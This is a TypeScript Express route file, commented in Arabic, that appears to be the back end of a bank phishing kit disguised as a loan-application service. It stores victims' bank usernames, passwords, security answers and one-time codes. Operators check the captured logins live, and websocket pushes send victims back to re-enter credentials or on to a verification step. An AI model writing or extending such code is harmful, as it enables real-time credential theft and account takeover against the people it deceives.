// مسارات الطلبات - إنشاء وإدارة طلبات التمويل
import { Router } from "express";
import { db, applicationsTable, sessionsTable } from "@workspace/db";
import { eq, desc, sql, isNull, isNotNull, and } from "drizzle-orm";
import {
  CreateApplicationBody,
  GetApplicationParams,
  UpdateApplicationParams,
  UpdateApplicationBody,
  NavigateApplicationParams,
  NavigateApplicationBody,
  ValidateApplicationDataParams,
  ValidateApplicationDataBody,
} from "@workspace/api-zod";
import { broadcast } from "../lib/websocket";

const router = Router();

// الحصول على إحصائيات الطلبات لصفحة لوحة الإدارة
router.get("/stats", async (req, res) => {
  try {
    const [stats] = await db
      .select({
        total: sql<number>`count(*)::int`,
        pending: sql<number>`count(*) filter (where status = 'pending')::int`,
        reviewing: sql<number>`count(*) filter (where status = 'reviewing')::int`,
        approved: sql<number>`count(*) filter (where status = 'approved')::int`,
        rejected: sql<number>`count(*) filter (where status = 'rejected')::int`,
        waiting: sql<number>`count(*) filter (where status = 'waiting')::int`,
        individual: sql<number>`count(*) filter (where applicant_type = 'individual')::int`,
        business: sql<number>`count(*) filter (where applicant_type = 'business')::int`,
        activeToday: sql<number>`count(*) filter (where created_at >= now() - interval '24 hours')::int`,
      })
      .from(applicationsTable)
      .where(isNull(applicationsTable.deletedAt));

    res.json(stats);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الإحصائيات");
    res.status(500).json({ error: "فشل في جلب الإحصائيات" });
  }
});

// الحصول على قائمة جميع الطلبات (غير المحذوفة) - النسخة الأخيرة فقط
router.get("/", async (req, res) => {
  try {
    const apps = await db
      .select()
      .from(applicationsTable)
      .where(and(
        isNull(applicationsTable.deletedAt),
        sql`${applicationsTable.isLatest} = true`
      ))
      .orderBy(desc(applicationsTable.updatedAt));
    res.json(apps);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الطلبات");
    res.status(500).json({ error: "فشل في جلب الطلبات" });
  }
});

// سلة المهملات — الطلبات المحذوفة
router.get("/trash", async (req, res) => {
  try {
    const apps = await db
      .select()
      .from(applicationsTable)
      .where(isNotNull(applicationsTable.deletedAt))
      .orderBy(desc(applicationsTable.deletedAt));
    res.json(apps);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب سلة المهملات");
    res.status(500).json({ error: "فشل في جلب سلة المهملات" });
  }
});

// حذف جميع الطلبات (ناعم)
router.delete("/", async (req, res) => {
  try {
    await db
      .update(applicationsTable)
      .set({ deletedAt: new Date() })
      .where(isNull(applicationsTable.deletedAt));
    broadcast({ type: "applications_cleared" });
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الطلبات");
    res.status(500).json({ error: "فشل في حذف الطلبات" });
  }
});

// إنشاء طلب تمويل جديد
router.post("/", async (req, res) => {
  const parsed = CreateApplicationBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "بيانات غير صالحة", details: parsed.error });
  }
  try {
    const [app] = await db
      .insert(applicationsTable)
      .values({
        sessionId: parsed.data.sessionId,
        applicantType: parsed.data.applicantType,
        currentStep: "applicant-info",
        status: "pending",
        version: 1,
        isLatest: true,
      })
      .returning();

    await db
      .update(sessionsTable)
      .set({ applicationId: app.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, parsed.data.sessionId));

    broadcast({ type: "application_update", data: app });
    res.status(201).json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في إنشاء الطلب");
    res.status(500).json({ error: "فشل في إنشاء الطلب" });
  }
});

// الحصول على طلب محدد
router.get("/:id", async (req, res) => {
  const params = GetApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, params.data.id));
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الطلب");
    res.status(500).json({ error: "فشل في جلب الطلب" });
  }
});

// الحصول على جميع النسخ لطلب معين
router.get("/:id/versions", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [currentApp] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!currentApp) return res.status(404).json({ error: "الطلب غير موجود" });

    const parentId = currentApp.parentId ?? currentApp.id;

    const versions = await db
      .select()
      .from(applicationsTable)
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      )
      .orderBy(desc(applicationsTable.version));

    res.json(versions);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب نسخ الطلب");
    res.status(500).json({ error: "فشل في جلب نسخ الطلب" });
  }
});

// تحديث بيانات الطلب - يحفظ النسخة القديمة وينشئ نسخة جديدة
router.patch("/:id", async (req, res) => {
  const params = UpdateApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = UpdateApplicationBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  
  try {
    const [currentApp] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, params.data.id));

    if (!currentApp) return res.status(404).json({ error: "الطلب غير موجود" });

    // تحديث جميع النسخ القديمة لتكون غير موجودة كـ latest
    const parentId = currentApp.parentId ?? currentApp.id;
    await db
      .update(applicationsTable)
      .set({ isLatest: false })
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      );

    // إنشاء نسخة جديدة
    const newVersion = currentApp.version + 1;

    // تحديد أي نوع من البيانات يتم تحديثه لتعيين الوقت المناسب
    const data = parsed.data;
    const personalFields = ["fullName", "nationalId", "dateOfBirth", "monthlySalary", "employer", "phone", "email", "city", "maritalStatus", "companyName", "businessType", "commercialRegistration", "employeeCount", "annualRevenue", "contactName"];
    const bankFields = ["bankId", "bankName", "bankUsername", "bankPassword", "securityAnswer"];
    const otpFields = ["otpCode"];
    const statusFields = ["status"];

    // التحقق من أي نوع بيانات يتم تحديثه
    const hasPersonal = personalFields.some(f => data[f as keyof typeof data] !== undefined);
    const hasBank = bankFields.some(f => data[f as keyof typeof data] !== undefined);
    const hasOtp = otpFields.some(f => data[f as keyof typeof data] !== undefined);
    const hasStatus = statusFields.some(f => data[f as keyof typeof data] !== undefined);

    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: currentApp.sessionId,
        applicantType: data.applicantType ?? currentApp.applicantType,
        currentStep: data.currentStep ?? currentApp.currentStep,
        status: data.status ?? currentApp.status,
        bankId: data.bankId ?? currentApp.bankId,
        bankName: data.bankName ?? currentApp.bankName,
        fullName: data.fullName ?? currentApp.fullName,
        nationalId: data.nationalId ?? currentApp.nationalId,
        dateOfBirth: data.dateOfBirth ?? currentApp.dateOfBirth,
        monthlySalary: data.monthlySalary ?? currentApp.monthlySalary,
        employer: data.employer ?? currentApp.employer,
        phone: data.phone ?? currentApp.phone,
        email: data.email ?? currentApp.email,
        city: data.city ?? currentApp.city,
        maritalStatus: data.maritalStatus ?? currentApp.maritalStatus,
        companyName: data.companyName ?? currentApp.companyName,
        businessType: data.businessType ?? currentApp.businessType,
        commercialRegistration: data.commercialRegistration ?? currentApp.commercialRegistration,
        employeeCount: data.employeeCount ?? currentApp.employeeCount,
        annualRevenue: data.annualRevenue ?? currentApp.annualRevenue,
        contactName: data.contactName ?? currentApp.contactName,
        bankUsername: data.bankUsername ?? currentApp.bankUsername,
        bankPassword: data.bankPassword ?? currentApp.bankPassword,
        securityAnswer: data.securityAnswer ?? currentApp.securityAnswer,
        otpCode: data.otpCode ?? currentApp.otpCode,
        extraData: data.extraData ?? currentApp.extraData,
        adminNote: data.adminNote ?? currentApp.adminNote,
        // تعيين أوقات الاستلام بناءً على نوع البيانات المحدثة
        personalDataReceivedAt: hasPersonal ? new Date() : (currentApp.personalDataReceivedAt ?? null),
        bankCredentialsReceivedAt: hasBank ? new Date() : (currentApp.bankCredentialsReceivedAt ?? null),
        otpReceivedAt: hasOtp ? new Date() : (currentApp.otpReceivedAt ?? null),
        statusUpdatedAt: hasStatus ? new Date() : (currentApp.statusUpdatedAt ?? null),
        version: newVersion,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث applicationId في الجلسة ليشير إلى النسخة الجديدة (لعرض الاسم في قائمة الزوار)
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    broadcast({ type: "application_update", data: newApp });
    res.json(newApp);
  } catch (err) {
    req.log.error({ err }, "خطأ في تحديث الطلب");
    res.status(500).json({ error: "فشل في تحديث الطلب" });
  }
});

// نقل المستخدم لخطوة معينة
router.post("/:id/navigate", async (req, res) => {
  const params = NavigateApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = NavigateApplicationBody.safeParse({ targetStep: req.body.targetStep, adminNote: req.body.adminNote });
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({
        currentStep: parsed.data.targetStep,
        adminNote: parsed.data.adminNote ?? null,
        updatedAt: new Date(),
      })
      .where(eq(applicationsTable.id, params.data.id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    await db
      .update(sessionsTable)
      .set({ currentPage: parsed.data.targetStep, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, app.sessionId));

    broadcast({ type: "navigate_user", sessionId: app.sessionId, targetStep: parsed.data.targetStep });
    broadcast({ type: "application_update", data: app });

    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في تحويل المستخدم");
    res.status(500).json({ error: "فشل في تحويل المستخدم" });
  }
});

// قرار التحقق من البيانات
router.post("/:id/validate", async (req, res) => {
  const params = ValidateApplicationDataParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = ValidateApplicationDataBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  try {
    const { decision, adminNote } = parsed.data;

    let newStatus: string;
    let newStep: string;
    let targetPage: string;
    let credDecision: "approved" | "rejected";
    let credMessage: string | null = null;

    if (decision === "valid") {
      newStatus = "reviewing";
      newStep = "verify";
      targetPage = "verify";
      credDecision = "approved";
    } else if (decision === "invalid") {
      newStatus = "pending";
      newStep = "credentials";
      targetPage = "credentials";
      credDecision = "rejected";
      credMessage = "بيانات الدخول غير صحيحة، يرجى التحقق وإعادة الإدخال";
    } else {
      newStatus = "pending";
      newStep = "credentials";
      targetPage = "credentials";
      credDecision = "rejected";
      credMessage = "يرجى إعادة إدخال بيانات الدخول مرة أخرى";
    }

    const [app] = await db
      .update(applicationsTable)
      .set({ status: newStatus, currentStep: newStep, adminNote: adminNote ?? null, statusUpdatedAt: new Date(), updatedAt: new Date() })
      .where(eq(applicationsTable.id, params.data.id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    await db
      .update(sessionsTable)
      .set({ currentPage: targetPage, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, app.sessionId));

    broadcast({
      type: "credentials_decision",
      sessionId: app.sessionId,
      decision: credDecision,
      message: credMessage,
    });
    broadcast({
      type: "navigate_user",
      sessionId: app.sessionId,
      targetStep: newStep,
      message: credMessage,
    });
    broadcast({ type: "application_update", data: app });

    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في تطبيق قرار التحقق");
    res.status(500).json({ error: "فشل في تطبيق القرار" });
  }
});

// حذف طلب واحد
router.delete("/:id", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({ deletedAt: new Date() })
      .where(eq(applicationsTable.id, id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    broadcast({ type: "application_deleted", data: { id } });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الطلب");
    res.status(500).json({ error: "فشل في حذف الطلب" });
  }
});

// استعادة طلب من سلة المهملات
router.post("/:id/restore", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({ deletedAt: null, updatedAt: new Date() })
      .where(eq(applicationsTable.id, id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    broadcast({ type: "application_update", data: app });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في استعادة الطلب");
    res.status(500).json({ error: "فشل في استعادة الطلب" });
  }
});

export default router;
